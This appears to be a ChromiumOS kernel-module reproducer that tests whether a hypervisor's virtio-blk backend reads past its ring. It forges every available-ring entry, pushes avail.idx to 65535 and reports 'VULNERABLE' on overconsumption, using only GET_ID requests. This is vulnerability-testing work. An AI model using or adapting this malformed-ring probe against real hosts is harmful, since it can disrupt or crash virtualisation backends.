// SPDX-License-Identifier: BSD-3-Clause
// Copyright 2026 The ChromiumOS Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

/*
 * Probe a split virtio-blk queue with an avail.idx more than one ring ahead.
 * All requests are GET_ID: no disk sectors are read or written.
 */

#include <linux/delay.h>
#include <linux/err.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/virtio.h>
#include <linux/virtio_blk.h>
#include <linux/virtio_config.h>
#include <linux/virtio_ids.h>
#include <linux/virtio_ring.h>

MODULE_LICENSE("Dual BSD/GPL");
MODULE_DESCRIPTION("Probe virtio-blk out-of-window avail.idx handling");

static char target[32];
module_param_string(target, target, sizeof(target), 0400);
MODULE_PARM_DESC(target, "virtioN device selected by run.sh");

struct repro_request {
	struct virtio_blk_outhdr header;
	u8 id[VIRTIO_BLK_ID_BYTES];
	u8 status;
	struct scatterlist sg[3];
};

struct repro_state {
	struct virtqueue *vq;
	struct repro_request request;
};

static int queue_get_id(struct virtio_device *vdev, struct repro_state *state)
{
	struct repro_request *req = &state->request;
	struct scatterlist *sgs[] = { &req->sg[0], &req->sg[1], &req->sg[2] };

	req->header.type = cpu_to_virtio32(vdev, VIRTIO_BLK_T_GET_ID);
	req->header.ioprio = 0;
	req->header.sector = 0;
	req->status = 0xff;
	sg_init_one(&req->sg[0], &req->header, sizeof(req->header));
	sg_init_one(&req->sg[1], req->id, sizeof(req->id));
	sg_init_one(&req->sg[2], &req->status, sizeof(req->status));
	return virtqueue_add_sgs(state->vq, sgs, 1, 2, req, GFP_KERNEL);
}

static u16 used_index(struct virtio_device *vdev, const struct vring *ring)
{
	return virtio16_to_cpu(vdev, READ_ONCE(ring->used->idx));
}

static int avail_idx_flood_probe(struct virtio_device *vdev)
{
	struct repro_state *state;
	const struct vring *ring;
	u16 before, avail, head, done;
	unsigned int i;
	int ret;

	if (strcmp(dev_name(&vdev->dev), target))
		return -ENODEV;
	if (virtio_has_feature(vdev, VIRTIO_F_RING_PACKED))
		return -EOPNOTSUPP;

	state = kzalloc(sizeof(*state), GFP_KERNEL);
	if (!state)
		return -ENOMEM;

	state->vq = virtio_find_single_vq(vdev, NULL, "avail_idx_flood");
	if (IS_ERR(state->vq)) {
		ret = PTR_ERR(state->vq);
		goto free_state;
	}
	ring = virtqueue_get_vring(state->vq);
	if (!ring || !ring->avail || !ring->used || ring->num < 2 ||
	    ring->num >= 0xffff) {
		ret = -EOPNOTSUPP;
		goto reset_queue;
	}

	virtio_device_ready(vdev);
	/* Let the VMM activate the backend before sending the control request. */
	msleep(1000);
	before = used_index(vdev, ring);
	ret = queue_get_id(vdev, state);
	if (ret)
		goto reset_queue;
	if (!virtqueue_notify(state->vq)) {
		ret = -EIO;
		goto reset_queue;
	}

	for (i = 0; i < 500 && used_index(vdev, ring) == before; i++)
		msleep(10);
	if (used_index(vdev, ring) != (u16)(before + 1)) {
		pr_err("avail_idx_flood: control GET_ID timed out; backend not confirmed active\n");
		ret = -ETIMEDOUT;
		goto reset_queue;
	}
	dma_rmb();
	if (READ_ONCE(state->request.status) != VIRTIO_BLK_S_OK) {
		pr_err("avail_idx_flood: control GET_ID failed\n");
		ret = -EIO;
		goto reset_queue;
	}

	/* Keep the completed descriptor mapped for the forged requests. */
	before = used_index(vdev, ring);
	avail = virtio16_to_cpu(vdev, READ_ONCE(ring->avail->idx));
	head = virtio16_to_cpu(vdev,
		READ_ONCE(ring->avail->ring[(u16)(avail - 1) % ring->num]));
	for (i = 0; i < ring->num; i++)
		WRITE_ONCE(ring->avail->ring[i], cpu_to_virtio16(vdev, head));
	virtio_wmb(false);
	WRITE_ONCE(ring->avail->idx, cpu_to_virtio16(vdev, 0xffff));
	virtio_wmb(false);
	pr_info("avail_idx_flood: %s GET_ID confirmed, ring=%u, avail.idx=%u -> 65535\n",
		dev_name(&vdev->dev), ring->num, avail);
	if (!virtqueue_notify(state->vq))
		pr_warn("avail_idx_flood: queue notification failed; result inconclusive\n");

	for (i = 0; i < 400; i++) {
		done = (u16)(used_index(vdev, ring) - before);
		if (done > ring->num)
			break;
		msleep(10);
	}
	done = (u16)(used_index(vdev, ring) - before);
	if (done > ring->num)
		pr_warn("avail_idx_flood: VULNERABLE: consumed %u requests from a %u-entry ring\n",
			done, ring->num);
	else if (!done)
		pr_info("avail_idx_flood: no completions; backend may be rejecting, stalled, or dead "
			"(check backend PID/log)\n");
	else
		pr_warn("avail_idx_flood: %u completions; result inconclusive\n", done);

	vdev->priv = state;
	return 0;

reset_queue:
	virtio_reset_device(vdev);
	vdev->config->del_vqs(vdev);
free_state:
	kfree(state);
	return ret;
}

static void avail_idx_flood_remove(struct virtio_device *vdev)
{
	struct repro_state *state = vdev->priv;

	virtio_reset_device(vdev);
	vdev->config->del_vqs(vdev);
	kfree(state);
}

static const struct virtio_device_id ids[] = {
	{ VIRTIO_ID_BLOCK, VIRTIO_DEV_ANY_ID },
	{ 0 },
};

static struct virtio_driver avail_idx_flood_driver = {
	.driver.name = "avail_idx_flood",
	.id_table = ids,
	.probe = avail_idx_flood_probe,
	.remove = avail_idx_flood_remove,
};

static int __init avail_idx_flood_init(void)
{
	if (!target[0])
		return -EINVAL;
	return register_virtio_driver(&avail_idx_flood_driver);
}

static void __exit avail_idx_flood_exit(void)
{
	unregister_virtio_driver(&avail_idx_flood_driver);
}

module_init(avail_idx_flood_init);
module_exit(avail_idx_flood_exit);
